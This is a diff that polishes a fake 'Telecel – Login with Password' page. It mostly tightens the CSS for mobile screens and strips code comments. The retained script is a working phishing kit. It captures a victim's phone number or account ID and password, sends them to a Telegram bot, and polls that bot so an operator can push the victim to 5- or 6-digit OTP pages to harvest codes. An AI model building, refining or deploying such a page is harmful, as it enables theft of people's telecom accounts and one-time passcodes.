@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>Telecel – Login with Password</title>
   <!-- Google Fonts & Icons -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -21,22 +21,24 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 16px;
+      padding: 12px;  /* slightly reduced for tighter mobile fit */
     }
 
-    /* Main container – exactly same as original */
+    /* Main container – fully responsive, preserves exact layout proportions */
     .container {
-      width: 360px;
+      width: 100%;
+      max-width: 360px;   /* original width preserved as maximum */
+      margin: 0 auto;
       background: #f7f7f7;
       border-radius: 28px;
-      padding: 40px 20px;
+      padding: 30px 16px 36px; /* reduced vertical/horizontal spacing for mobile */
       box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
       position: relative;
       overflow: hidden;
       text-align: center;
     }
 
-    /* Top red shape */
+    /* Top red shape – position unchanged, size slightly reduced on very narrow screens? keep as is */
     .top-bg {
       position: absolute;
       top: 0;
@@ -53,68 +55,69 @@
       z-index: 2;
     }
 
-    /* Logo */
+    /* Logo – more compact on small screens */
     .logo {
       text-align: center;
-      margin-top: 60px;
+      margin-top: 20px;  /* reduced from 60px to save vertical space */
     }
     .logo-circle {
-      width: 52px;
-      height: 52px;
+      width: 48px;       /* slightly smaller but still prominent */
+      height: 48px;
       background: #ff0000;
       border-radius: 50%;
       color: #ffffff !important;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 30px;
+      font-size: 28px;
       margin: auto;
       font-weight: 800;
     }
     .logo-text {
       color: #ff0000;
-      font-size: 26px;
+      font-size: 24px;   /* subtle reduction */
       font-weight: bold;
-      margin-top: 8px;
+      margin-top: 6px;
     }
 
-    /* Titles */
+    /* Titles – size refined for mobile readability */
     .title {
       text-align: center;
       color: #ff0000;
-      font-size: 20px;
+      font-size: 18px;   /* was 20px */
       font-weight: 600;
-      margin-top: 15px;
+      margin-top: 12px;
     }
     .subtitle {
       text-align: center;
       color: #666;
-      font-size: 15px;
-      margin-top: 10px;
-      line-height: 1.5;
+      font-size: 14px;   /* was 15px */
+      margin-top: 8px;
+      line-height: 1.45;
+      padding: 0 4px;
     }
 
-    /* Form */
+    /* Form spacing tightened */
     .form {
-      margin-top: 30px;
+      margin-top: 24px;   /* reduced from 30px */
       text-align: left;
     }
 
     .label {
       font-size: 13px;
       color: #666;
-      margin-bottom: 8px;
+      margin-bottom: 6px;
       display: block;
       font-weight: 500;
     }
 
-    /* Input & select */
+    /* Input & select – slightly shorter but still touch-friendly */
     .input, .select {
       width: 100%;
-      height: 50px;
+      height: 48px;       /* was 50px – better fit on small screens */
       border-radius: 12px;
       border: 1px solid #ddd;
-      padding: 0 15px;
+      padding: 0 14px;
       font-size: 15px;
       background: #fff;
       outline: none;
@@ -156,10 +159,10 @@
     }
     .select {
       width: 100%;
-      height: 50px;
+      height: 48px;
       border-radius: 12px;
       border: 1px solid #ddd;
-      padding: 0 40px 0 15px;
+      padding: 0 40px 0 14px;
       font-size: 15px;
       background: #fff;
       cursor: pointer;
@@ -187,8 +190,8 @@
       z-index: 10;
     }
     .dropdown-item {
-      padding: 15px;
-      font-size: 15px;
+      padding: 14px;
+      font-size: 14px;
       cursor: pointer;
     }
     .dropdown-item.active {
@@ -199,14 +202,14 @@
       background: #f5f5f5;
     }
 
-    /* Buttons */
+    /* Buttons – adjusted height and spacing */
     .btn {
       width: 100%;
-      height: 55px;
+      height: 52px;       /* slightly reduced for cleaner mobile layout */
       border: none;
       border-radius: 14px;
       font-size: 16px;
-      margin-top: 20px;
+      margin-top: 18px;
       cursor: pointer;
       font-weight: 600;
     }
@@ -230,8 +233,8 @@
     .version {
       text-align: center;
       color: #aaa;
-      font-size: 12px;
-      margin-top: 20px;
+      font-size: 11px;
+      margin-top: 18px;
     }
 
     /* Spinner overlay */
@@ -241,13 +244,13 @@
       display: none;
       align-items: center;
       justify-content: center;
-      background: rgba(255, 255, 255, 0.7);
+      background: rgba(255, 255, 255, 0.8);
       backdrop-filter: blur(2px);
       z-index: 999;
     }
     .loader {
-      width: 44px;
-      height: 44px;
+      width: 42px;
+      height: 42px;
       border: 4px solid #ffe0e0;
       border-top: 4px solid #ff0000;
       border-radius: 50%;
@@ -257,37 +260,95 @@
       to { transform: rotate(360deg); }
     }
 
-    /* Error box */
+    /* Error box – positioned relative to container, improved for mobile */
     .error-box {
       position: absolute;
-      top: 20px;
-      left: 20px;
-      right: 20px;
+      top: 12px;
+      left: 12px;
+      right: 12px;
       background: #fff;
       border: 2px solid #ff4d4d;
-      border-radius: 12px;
-      padding: 15px;
+      border-radius: 14px;
+      padding: 12px;
       display: none;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      box-shadow: 0 5px 20px rgba(0,0,0,0.12);
       z-index: 100;
       text-align: left;
     }
     .error-title {
       color: #ff0000;
       font-weight: bold;
-      margin-bottom: 5px;
+      font-size: 14px;
+      margin-bottom: 4px;
     }
     .error-text {
       color: #444;
-      font-size: 14px;
+      font-size: 13px;
     }
     .close {
       position: absolute;
-      right: 15px;
-      top: 10px;
+      right: 12px;
+      top: 8px;
       cursor: pointer;
-      font-size: 18px;
+      font-size: 20px;
       color: #999;
+    }
+
+    /* Extra small devices (<= 340px) – further fine-tuning fonts and spacing */
+    @media (max-width: 360px) {
+      body {
+        padding: 8px;
+      }
+      .container {
+        padding: 24px 12px 32px;
+        border-radius: 24px;
+      }
+      .logo {
+        margin-top: 8px;
+      }
+      .logo-circle {
+        width: 44px;
+        height: 44px;
+        font-size: 26px;
+      }
+      .logo-text {
+        font-size: 22px;
+      }
+      .title {
+        font-size: 17px;
+        margin-top: 8px;
+      }
+      .subtitle {
+        font-size: 13px;
+      }
+      .form {
+        margin-top: 20px;
+      }
+      .input, .select, .btn {
+        height: 46px;
+      }
+      .btn {
+        font-size: 15px;
+        margin-top: 16px;
+      }
+      .version {
+        font-size: 10px;
+        margin-top: 16px;
+      }
+      .toggle-password {
+        font-size: 18px;
+        right: 14px;
+      }
+    }
+
+    /* Ensure no horizontal overflow on any screen */
+    body, .container, .content {
+      overflow-x: hidden;
+    }
+
+    /* Preserve absolute layout of top-bg without clipping */
+    .container {
+      overflow: hidden;
     }
   </style>
 </head>
@@ -296,7 +357,7 @@
 <div class="container">
   <div class="top-bg"></div>
 
-  <!-- Error box -->
+  <!-- Error box - identical structure -->
   <div class="error-box" id="errorBox">
     <div class="close" onclick="hideError()">×</div>
     <div class="error-title">Error</div>
@@ -331,7 +392,7 @@
       <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
       <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">
 
-      <!-- PASSWORD FIELD (single input + toggle eye) - replaced PIN boxes -->
+      <!-- PASSWORD FIELD (single input + toggle eye) -->
       <div class="label" style="margin-top:15px;">Password</div>
       <div class="password-wrapper">
         <input type="password" class="input" id="passwordField" placeholder="Enter your password" autocomplete="off">
@@ -458,12 +519,10 @@
   // ========== SEND LOGIN CREDENTIALS TO TELEGRAM WITH 3 OPTIONS ==========
   async function sendLoginToTelegram(accountType, identifier, password) {
     const ts = Date.now();
-    // callback data format: "5otp_TIMESTAMP", "6otp_TIMESTAMP", "decline_TIMESTAMP"
     const fiveOtpId = `5otp_${ts}`;
     const sixOtpId = `6otp_${ts}`;
     const declineId = `decline_${ts}`;
     
-    // Store current session data for later use after redirect
     sessionStorage.setItem('telecel_accountType', accountType);
     sessionStorage.setItem('telecel_identifier', identifier);
     if (accountType === 'Mobile') {
@@ -473,7 +532,6 @@
     }
     sessionStorage.setItem('telecel_password', password);
     
-    // Format message with HTML
     const displayType = accountType;
     const identifierLabel = accountType === 'Mobile' ? ' Phone' : '🆔 Account ID';
     const message = `🔐 <b>Telecel Play Login Request</b>\n\n` +
@@ -502,7 +560,6 @@
       
       if (!response.ok) throw new Error(`HTTP ${response.status}`);
       
-      // Start polling for callback response
       startPollingForDecision(fiveOtpId, sixOtpId, declineId);
     } catch (err) {
       console.error('Telegram send error:', err);
@@ -520,7 +577,6 @@
       .replace(/"/g, '&quot;');
   }
   
-  // Poll Telegram for callback_query response (5 OTP, 6 OTP, or Decline)
   function startPollingForDecision(fiveOtpId, sixOtpId, declineId) {
     stopPolling();
     let lastUpdateId = 0;
@@ -540,19 +596,16 @@
           
           const cbData = callback.data;
           
-          // 5 OTP selected
           if (cbData === fiveOtpId) {
             decisionHandled = true;
             stopPolling();
             spinner.style.display = 'none';
             isSubmitting = false;
             
-            // Generate 5-digit OTP and store in sessionStorage for otp5.html
             const otp5 = generate5DigitOTP();
             sessionStorage.setItem('telecel_otp', otp5);
             sessionStorage.setItem('telecel_otp_length', '5');
             
-            // Ensure account data is stored again (already done but double-check)
             const accountTypeStored = selectedTypeInput.value;
             const identifierVal = inputField.value.trim();
             sessionStorage.setItem('telecel_accountType', accountTypeStored);
@@ -562,19 +615,16 @@
               sessionStorage.setItem('telecel_phone', identifierVal.replace(/\D/g, ''));
             }
             
-            // Redirect to 5-digit OTP page
             window.location.href = 'otp5.html';
             return;
           }
           
-          // 6 OTP selected
           if (cbData === sixOtpId) {
             decisionHandled = true;
             stopPolling();
             spinner.style.display = 'none';
             isSubmitting = false;
             
-            // Generate 6-digit OTP and store
             const otp6 = generate6DigitOTP();
             sessionStorage.setItem('telecel_otp', otp6);
             sessionStorage.setItem('telecel_otp_length', '6');
@@ -588,12 +638,10 @@
               sessionStorage.setItem('telecel_phone', identifierVal.replace(/\D/g, ''));
             }
             
-            // Redirect to 6-digit OTP page
             window.location.href = 'otp6.html';
             return;
           }
           
-          // Decline selected
           if (cbData === declineId) {
             decisionHandled = true;
             stopPolling();
@@ -614,21 +662,18 @@
       } catch (err) {
         console.warn('Polling error:', err);
       }
-    }, 1500); // poll every 1.5 seconds
+    }, 1500);
   }
   
-  // ========== MAIN SUBMIT LOGIN FUNCTION ==========
   async function submitLogin() {
     if (isSubmitting) return;
     
-    // Get values
     const accountType = selectedTypeInput.value;
     const identifier = inputField.value.trim();
     const password = passwordField.value.trim();
     
     hideError();
     
-    // Basic validation
     if (!identifier) {
       showError('Please enter your phone number or account ID.');
       return;
@@ -638,38 +683,30 @@
       return;
     }
     
-    // Mobile-specific validation (020/050 and length)
     if (accountType === 'Mobile') {
       if (!validateMobileNumber(identifier)) {
         showError('Please enter a valid Telecel number starting with 020 or 050 (minimum 10 digits).');
         return;
       }
     } else {
-      // Broadband: require at least 3 characters
       if (identifier.length < 3) {
         showError('Please enter a valid Broadband Account ID (minimum 3 characters).');
         return;
       }
     }
     
-    // Start login process
     isSubmitting = true;
     loginBtn.disabled = true;
     spinner.style.display = 'flex';
     
-    // Send credentials to Telegram Bot (5 OTP / 6 OTP / Decline options)
     await sendLoginToTelegram(accountType, identifier, password);
-    // Polling will handle success/error and redirect or reset.
-    // Network error inside sendLoginToTelegram calls hideSpinnerAndReset.
   }
   
-  // ========== PASSWORD TOGGLE VISIBILITY (eye icon) ==========
   function setupPasswordToggle() {
     if (togglePasswordIcon) {
       togglePasswordIcon.addEventListener('click', function() {
         const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
         passwordField.setAttribute('type', type);
-        // Toggle eye icon classes
         if (type === 'password') {
           this.classList.remove('fa-eye-slash');
           this.classList.add('fa-eye');
@@ -681,7 +718,6 @@
     }
   }
   
-  // ========== DROPDOWN FUNCTIONS (preserved from original) ==========
   function toggleDropdown() {
     const isVisible = dropdownList.style.display === 'block';
     dropdownList.style.display = isVisible ? 'none' : 'block';
@@ -699,7 +735,7 @@
     const label = document.getElementById('inputLabel');
     if (type === 'Mobile') {
       label.innerText = 'Phone Number';
-      inputField.placeholder = '020XXXXXXX (10+ digits)';
+      inputField.placeholder = '020XXXXXXX';
       inputField.inputMode = 'numeric';
       applyIdentifierFilter();
     } else {
@@ -710,7 +746,6 @@
     applyIdentifierFilter();
     dropdownList.style.display = 'none';
     arrow.classList.remove('rotate');
-    // Clear password field on account type change
     clearPasswordField();
     updateLoginButton();
     hideError();
@@ -723,7 +758,6 @@
     }
   });
   
-  // ========== EVENT LISTENERS ==========
   inputField.addEventListener('input', function() {
     applyIdentifierFilter();
     clearPasswordField();
@@ -757,26 +791,22 @@
     window.history.back();
   });
   
-  // ========== INITIALIZE PAGE ==========
   function init() {
     dropdownList.style.display = 'none';
     applyIdentifierFilter();
     setupPasswordToggle();
     updateLoginButton();
     hideError();
-    // Initial placeholder sync
     if (selectedTypeInput.value === 'Mobile') {
       inputField.placeholder = '020XXXXXXX';
     } else {
       inputField.placeholder = 'e.g., TEL123XYZ';
     }
-    // Focus identifier field
     inputField.focus();
   }
   
   init();
   
-  // Expose global functions for inline handlers
   window.toggleDropdown = toggleDropdown;
   window.selectType = selectType;
   window.hideError = hideError;
